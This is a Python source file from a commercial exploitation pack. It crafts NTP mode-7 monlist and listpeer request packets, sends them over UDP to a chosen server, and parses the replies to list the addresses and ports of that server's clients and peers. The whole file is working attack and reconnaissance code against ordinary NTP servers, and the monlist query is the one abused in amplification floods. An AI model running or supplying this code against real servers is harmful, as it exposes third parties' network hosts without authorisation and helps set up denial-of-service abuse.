#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

# References :
# - http://carnal0wnage.attackresearch.com/node/410
# - http://www.sensepost.com/blog/4552.html

import socket
import select
from struct import unpack

import net.misc

PAYLOAD = """\x17\x00\x03\xAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""

def create_socket():
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.bind(('0.0.0.0', 0))
  return sock

def create_payload_monlist():
  return PAYLOAD.replace('\xAA', '\x2a')

def create_payload_listpeer():
  return PAYLOAD.replace('\xAA', '\x00')

def send_payload(sock, payload, host, port):
  try:
    sock.sendto(payload, (host, port))
  except Exception, e:
    print '[-] %s' % e
    return 1
  return 0
 
def parse_ntp_packet(data):
  if len(data) < 8:
    print '[-] Error parsing packet[NO_HEADER]'
    return

  ntp_flags, ntp_auth, ntp_vers, ntp_req_code, num_items, item_size  = unpack('!BBBBHH', data[0:8])
  data = data[8:]
  response = ntp_flags & (1 << 7) > 0
  more = ntp_flags & (1 << 6) > 0

  result = []
  if not response: 
    print '[-] Error parsing packet[REQUEST_PACKET]'
  elif ntp_req_code == 42: 
    if item_size != 72: print '[-] Error parsing packet[WRONG_ITEM_SIZE]'
    elif num_items < 1: print '[-] Error parsing packet[WRONG_ITEM_COUNT]'
    elif len(data) < num_items*item_size: print '[-] Error parsing packet[SHORT_PACKET]'
    else:
      for offset in range(0, num_items*item_size, item_size):
        parts = unpack('!IIIIIIIHBBIIIIIIIIII', data[offset:offset+item_size])
        ip = net.misc.int_ip_to_str(parts[4])
        port = parts[7]
        result.append('%s:%s' % (ip, port))
  elif ntp_req_code == 0: 
    if item_size != 32: print '[-] Error parsing packet[WRONG_ITEM_SIZE]'
    elif num_items < 1: print '[-] Error parsing packet[WRONG_ITEM_COUNT]'
    elif len(data) < num_items*item_size: print '[-] Error parsing packet[SHORT_PACKET]'
    else:
      for offset in range(0, num_items*item_size, item_size):
        parts = unpack('!IHBBIIIIII', data[offset:offset+item_size])
        ip = net.misc.int_ip_to_str(parts[0])
        port = parts[1]
        result.append('%s:%s' % (ip, port))
  else:
    print '[-] Error parsing packet[WRONG_REQUEST_CODE]'
  return result

def recv_data(sock, payload, host, port):
  def resolv_ip(ip):
    try:
      hostname, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)
    except:
      hostname = ''
    return hostname

  count = 0
  tmp = []
  result = []        
  while True:
    rlist, wlist, xlist = select.select([sock], [], [], 2)
    if sock in rlist:
      data, addr = sock.recvfrom(1024)
      tmp.extend(parse_ntp_packet(data))
    else:
      break

  for t in tmp:
    (ip, port) = t.split(':')
    hostname = resolv_ip(ip)
    if hostname:
      result.append('%s - %s - %s' % (hostname, ip, port))
    else:
      result.append('%s - %s' % (ip, port))
  return result
